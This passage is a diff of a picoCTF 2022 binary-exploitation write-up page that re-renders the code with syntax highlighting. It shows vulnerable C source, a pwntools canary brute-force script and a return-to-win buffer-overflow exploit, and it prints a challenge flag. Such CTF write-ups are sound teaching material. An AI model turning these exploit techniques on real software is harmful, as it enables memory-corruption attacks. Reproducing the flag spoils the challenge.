+</span></span><span style="display:flex;"><span>write(<span style="color:#e6db74">&#39;payload&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start a new process</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PWN</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;string: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Receive the flag</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/picoctf2022-binexp/bof2.png" alt="IMG"></p>
 <p>Flag:</p>
 <pre tabindex="0"><code>picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
 </code></pre><h2 id="buffer-overflow-3">buffer overflow 3</h2>
@@ -605,84 +605,84 @@ io.interactive()
 <p>Do you think you can bypass the protection and get the flag?
 It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows.</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;wchar.h&gt;
-#include &lt;locale.h&gt;
-
-#define BUFSIZE 64
-#define FLAGSIZE 64
-#define CANARY_SIZE 4
-
-void win() {
-  char buf[FLAGSIZE];
-  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
-  if (f == NULL) {
-    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
-                    &#34;own debugging flag.\n&#34;);
-    exit(0);
-  }
-
-  fgets(buf,FLAGSIZE,f); // size bound read
-  puts(buf);
-  fflush(stdout);
-}
-
-char global_canary[CANARY_SIZE];
-void read_canary() {
-  FILE *f = fopen(&#34;canary.txt&#34;,&#34;r&#34;);
-  if (f == NULL) {
-    printf(&#34;%s %s&#34;, &#34;Please create &#39;canary.txt&#39; in this directory with your&#34;,
-                    &#34;own debugging canary.\n&#34;);
-    exit(0);
-  }
-
-  fread(global_canary,sizeof(char),CANARY_SIZE,f);
-  fclose(f);
-}
-
-void vuln(){
-   char canary[CANARY_SIZE];
-   char buf[BUFSIZE];
-   char length[BUFSIZE];
-   int count;
-   int x = 0;
-   memcpy(canary,global_canary,CANARY_SIZE);
-   printf(&#34;How Many Bytes will You Write Into the Buffer?\n&gt; &#34;);
-   while (x&lt;BUFSIZE) {
-      read(0,length+x,1);
-      if (length[x]==&#39;\n&#39;) break;
-      x++;
-   }
-   sscanf(length,&#34;%d&#34;,&amp;count);
-
-   printf(&#34;Input&gt; &#34;);
-   read(0,buf,count);
-
-   if (memcmp(canary,global_canary,CANARY_SIZE)) {
-      printf(&#34;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&#34;); // crash immediately
-      exit(-1);
-   }
-   printf(&#34;Ok... Now Where&#39;s the Flag?\n&#34;);
-   fflush(stdout);
-}
-
-int main(int argc, char **argv){
-
-  setvbuf(stdout, NULL, _IONBF, 0);
-  
-  // Set the gid to the effective gid
-  // this prevents /bin/sh from dropping the privileges
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
-  read_canary();
-  vuln();
-  return 0;
-}
-</code></pre><p>From the source code we can see it implemented canary, the canary is read from <code>canary.txt</code> with the size of 4 characters/bytes. To bruteforce it, there will be like 2^32 possible of values, which is 4 billion of possibilities.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wchar.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;locale.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CANARY_SIZE 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  fgets(buf,FLAGSIZE,f); <span style="color:#75715e">// size bound read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  puts(buf);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> global_canary[CANARY_SIZE];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_canary</span>() {
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;canary.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;canary.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging canary.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  fread(global_canary,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),CANARY_SIZE,f);
+</span></span><span style="display:flex;"><span>  fclose(f);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">char</span> canary[CANARY_SIZE];
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">char</span> buf[BUFSIZE];
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">char</span> length[BUFSIZE];
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">int</span> count;
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">int</span> x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>   memcpy(canary,global_canary,CANARY_SIZE);
+</span></span><span style="display:flex;"><span>   printf(<span style="color:#e6db74">&#34;How Many Bytes will You Write Into the Buffer?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">while</span> (x<span style="color:#f92672">&lt;</span>BUFSIZE) {
+</span></span><span style="display:flex;"><span>      read(<span style="color:#ae81ff">0</span>,length<span style="color:#f92672">+</span>x,<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (length[x]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;\n&#39;</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      x<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span>   sscanf(length,<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>count);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   printf(<span style="color:#e6db74">&#34;Input&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>   read(<span style="color:#ae81ff">0</span>,buf,count);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> (memcmp(canary,global_canary,CANARY_SIZE)) {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;***** Stack Smashing Detected ***** : Canary Value Corrupt!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); <span style="color:#75715e">// crash immediately
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span>   printf(<span style="color:#e6db74">&#34;Ok... Now Where&#39;s the Flag?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>   fflush(stdout);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Set the gid to the effective gid
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// this prevents /bin/sh from dropping the privileges
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  gid_t gid <span style="color:#f92672">=</span> getegid();
+</span></span><span style="display:flex;"><span>  setresgid(gid, gid, gid);
+</span></span><span style="display:flex;"><span>  read_canary();
+</span></span><span style="display:flex;"><span>  vuln();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From the source code we can see it implemented canary, the canary is read from <code>canary.txt</code> with the size of 4 characters/bytes. To bruteforce it, there will be like 2^32 possible of values, which is 4 billion of possibilities.</p>
 <p>Now, there is a smart way to bruteforce it without needing to go through 4 billion of possibilities. In the <code>vuln()</code> function, we can see it read our input using <code>read(0,buf,count);</code>, where the function do not append a NULL byte to the end of our input buffer, unlike <code>scanf()</code>. So what that means is that we can reduce the possibilities to 4 set of 256 characters which are a total of 1024 tries, by appending character by character. For example:</p>
 <pre tabindex="0"><code>a    (Stack Smash!)
 b    (Stack Smash!)
@@ -696,294 +696,294 @@ dea  (No Stack Smash!)
 deaa (Stack Smash!)
 </code></pre><p>Also, keep in mind that we cannot include Carriage Return (<code>\r</code>) or Line Feed (<code>\n</code>) in our input buffer, else it will stop the <code>read()</code> function.</p>
 <p>Below is the script that will leak the canary from server, notice that we use <code>send()</code> instead of <code>sendline()</code>:</p>
-<pre tabindex="0"><code>#!/usr/bin/env python3
-from pwn import *
-from time import sleep
-from itertools import permutations
-import time
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Specify your GDB script here for debugging
-gdbscript = &#39;&#39;&#39;
-init-pwndbg
-continue
-&#39;&#39;&#39;.format(**locals())
-
-# Set up pwntools for the correct architecture
-exe = &#39;./vuln&#39;
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Enable verbose logging so we can see exactly what is being sent (info/debug)
-context.log_level = &#39;error&#39;
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-# from buffer to stack canary
-pad1 = 64
-
-# The stored values from the leaked canary
-canary = [&#39;A&#39;, &#39;A&#39;, &#39;A&#39;, &#39;A&#39;]
-
-# loop through all 4 entries of the canary
-for i in range(4):
-    # loop through all possible bytes for each entry
-    for c in range(255):    
-        p = start();
-        p.recv()
-        p.sendline(b&#34;-1&#34;); 
-        p.recv()
-
-        payload = b&#34;A&#34; * pad1 # initial padding
-        payload += &#34;&#34;.join(canary[0:i]).encode() # the canary we&#39;ve leaked so far
-        payload += chr(c).encode() # the new character to try
-        print(payload)
-        p.send(payload)
-        recv = p.recv()
-        p.close()
-
-        # Check the output
-        if b&#39;Stack Smash&#39; not in recv:
-            canary[i] = chr(c) # add the found value
-            break
-
-print(&#34;&#34;.join(canary))
-</code></pre><p><img src="/img/picoctf2022-binexp/bof3-leak_canary.png" alt="IMG"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> permutations
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allows you to switch between local/GDB/remote from terminal</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:  <span style="color:#75715e"># Set GDBscript below</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:  <span style="color:#75715e"># (&#39;server&#39;, &#39;port&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:  <span style="color:#75715e"># Run locally</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">init-pwndbg
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up pwntools for the correct architecture</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./vuln&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This will automatically get context arch, bits, os etc</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(exe, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enable verbose logging so we can see exactly what is being sent (info/debug)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># from buffer to stack canary</span>
+</span></span><span style="display:flex;"><span>pad1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The stored values from the leaked canary</span>
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># loop through all 4 entries of the canary</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># loop through all possible bytes for each entry</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">255</span>):    
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> start();
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1&#34;</span>); 
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> pad1 <span style="color:#75715e"># initial padding</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(canary[<span style="color:#ae81ff">0</span>:i])<span style="color:#f92672">.</span>encode() <span style="color:#75715e"># the canary we&#39;ve leaked so far</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> chr(c)<span style="color:#f92672">.</span>encode() <span style="color:#75715e"># the new character to try</span>
+</span></span><span style="display:flex;"><span>        print(payload)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>        recv <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check the output</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Stack Smash&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> recv:
+</span></span><span style="display:flex;"><span>            canary[i] <span style="color:#f92672">=</span> chr(c) <span style="color:#75715e"># add the found value</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(canary))
+</span></span></code></pre></div><p><img src="/img/picoctf2022-binexp/bof3-leak_canary.png" alt="IMG"></p>
 <p>From the picture we can see we leaked the canary, now we just need to carefully assemble the structure of our payload:</p>
-<pre tabindex="0"><code>from pwn import *
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Specify your GDB script here for debugging
-gdbscript = &#39;&#39;&#39;
-init-pwndbg
-continue
-&#39;&#39;&#39;.format(**locals())
-
-# Set up pwntools for the correct architecture
-exe = &#39;./vuln&#39;
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Enable verbose logging so we can see exactly what is being sent (info/debug)
-context.log_level = &#39;error&#39;
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-# canary token leaked by using leak_canary.py
-canry = b&#34;BiRd&#34; 
-
-# Start program
-io = start()
-
-offset = 64  # Canary offset
-
-io.sendlineafter(b&#39;&gt; &#39;, b&#39;-1&#39;)
-
-io.recvuntil(b&#39;Input&gt; &#39;)
-
-# Build payload (return to win)
-payload = flat([
-    offset * b&#39;A&#39;,  # Pad to canary (64)
-    canry,  # Our leaked canary (4)
-    16 * b&#39;A&#39;,  # Pad to Ret pointer (8)
-    elf.symbols.win  # Jmp to win function
-])
-
-# Send the payload
-io.sendline(payload)
-
-# Get Flag
-print(io.recv())
-
-io.interactive()
-</code></pre><p>Flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allows you to switch between local/GDB/remote from terminal</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:  <span style="color:#75715e"># Set GDBscript below</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:  <span style="color:#75715e"># (&#39;server&#39;, &#39;port&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:  <span style="color:#75715e"># Run locally</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">init-pwndbg
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up pwntools for the correct architecture</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./vuln&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This will automatically get context arch, bits, os etc</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(exe, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enable verbose logging so we can see exactly what is being sent (info/debug)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># canary token leaked by using leak_canary.py</span>
+</span></span><span style="display:flex;"><span>canry <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;BiRd&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start program</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>  <span style="color:#75715e"># Canary offset</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Input&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build payload (return to win)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat([
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>,  <span style="color:#75715e"># Pad to canary (64)</span>
+</span></span><span style="display:flex;"><span>    canry,  <span style="color:#75715e"># Our leaked canary (4)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>,  <span style="color:#75715e"># Pad to Ret pointer (8)</span>
+</span></span><span style="display:flex;"><span>    elf<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>win  <span style="color:#75715e"># Jmp to win function</span>
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the payload</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get Flag</span>
+</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recv())
+</span></span><span style="display:flex;"><span>
